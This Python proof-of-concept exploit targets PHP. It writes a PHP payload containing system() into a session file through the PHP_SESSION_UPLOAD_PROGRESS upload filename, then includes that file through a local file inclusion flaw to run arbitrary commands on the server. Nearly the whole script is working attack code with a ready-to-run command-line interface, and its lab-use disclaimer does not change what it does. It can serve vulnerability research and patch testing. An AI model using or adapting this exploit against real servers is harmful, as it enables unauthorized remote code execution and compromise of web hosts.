#!/usr/bin/env python3
"""
Chain 1: Session Upload Progress Injection + LFI = RCE
CVE-2026-109618 / CVE-2026-109619 attack surface

This demonstrates the session-file-injection primitive:
  1. Attacker sends multipart POST with PHP_SESSION_UPLOAD_PROGRESS
  2. PHP writes the filename UNVALIDATED into a session file
  3. Attacker includes the poisoned session file via an LFI vulnerability
  4. PHP executes the injected code as the web server user

This chain requires an LFI vulnerability in the target application.
It works when session.upload_progress.cleanup = Off (two-step, 100% reliable).
For the race variant (cleanup=On), see race.py.

NOTE: This technique was first documented by Orange Tsai at HITCON CTF 2018.
It uses the same code path exploited by CVE-2026-109618/109619 but is NOT
the novel OOM corruption. See chain2_oom/ for the actual CVE.

Tested against: PHP 5.4+ through 8.4.26 (pre-patch) with default config.
For authorized security research and local lab use only.
"""

import argparse
import socket
import sys
import urllib.request
import urllib.error


def build_inject_request(host, port, upload_path, session_id, cmd):
    boundary = "----php2shellBoundary"
    payload = f"<?php echo '---RCE-START---'; system('{cmd}'); echo '---RCE-END---'; ?>"

    body = b""
    body += f"--{boundary}\r\n".encode()
    body += b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    body += b"rce\r\n"
    body += f"--{boundary}\r\n".encode()
    body += f'Content-Disposition: form-data; name="file"; filename="{payload}"\r\n'.encode()
    body += b"Content-Type: application/octet-stream\r\n\r\n"
    body += b"x\r\n"
    body += f"--{boundary}--\r\n".encode()

    request = f"POST {upload_path} HTTP/1.1\r\n".encode()
    request += f"Host: {host}:{port}\r\n".encode()
    request += f"Cookie: PHPSESSID={session_id}\r\n".encode()
    request += f"Content-Type: multipart/form-data; boundary={boundary}\r\n".encode()
    request += f"Content-Length: {len(body)}\r\n".encode()
    request += b"Connection: close\r\n\r\n"
    request += body
    return request


def send_inject(host, port, upload_path, session_id, cmd):
    request = build_inject_request(host, port, upload_path, session_id, cmd)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, port))
    sock.sendall(request)

    resp = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            resp += chunk
        except socket.timeout:
            break
    sock.close()
    return resp.split(b"\r\n")[0].decode()


def trigger_lfi(host, port, lfi_path, session_file):
    url = f"http://{host}:{port}{lfi_path}?page={session_file}"
    try:
        resp = urllib.request.urlopen(url, timeout=5)
        return resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return f"HTTP {e.code}"
    except Exception as e:
        return str(e)


def extract_output(body):
    start = body.find("---RCE-START---")
    end = body.find("---RCE-END---")
    if start != -1 and end != -1:
        return body[start + 15:end].strip()
    return ""


def main():
    ap = argparse.ArgumentParser(
        description="Chain 1: Session injection + LFI (cleanup=Off, two-step)")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8898)
    ap.add_argument("--lfi-path", default="/vuln_lfi.php")
    ap.add_argument("--upload-path", default="/index.php")
    ap.add_argument("--session-id", default="php2shell-rce")
    ap.add_argument("--session-save-path", default="/tmp")
    ap.add_argument("cmd", nargs="?", default="id",
                    help="Command to execute (default: id)")
    args = ap.parse_args()

    session_file = f"{args.session_save_path}/sess_{args.session_id}"

    print("=" * 60)
    print("Chain 1: Session Injection + LFI (cleanup=Off)")
    print("=" * 60)
    print()
    print(f"  Target:       http://{args.host}:{args.port}")
    print(f"  Session ID:   {args.session_id}")
    print(f"  Session file: {session_file}")
    print(f"  Command:      {args.cmd}")
    print()

    print("[1] Injecting payload via upload_progress filename...")
    status = send_inject(args.host, args.port, args.upload_path,
                         args.session_id, args.cmd)
    print(f"    Response: {status}")

    print("[2] Triggering via LFI inclusion...")
    body = trigger_lfi(args.host, args.port, args.lfi_path, session_file)
    output = extract_output(body)

    if output:
        print()
        print(f"[+] RCE confirmed. Output:")
        print(f"    {output}")
        return 0
    else:
        print()
        print("[-] No output. Possible causes:")
        print("    - session.upload_progress.cleanup = On (use race.py instead)")
        print("    - LFI path incorrect or filtered")
        print("    - Session save path differs from expected")
        return 1


if __name__ == "__main__":
    sys.exit(main())
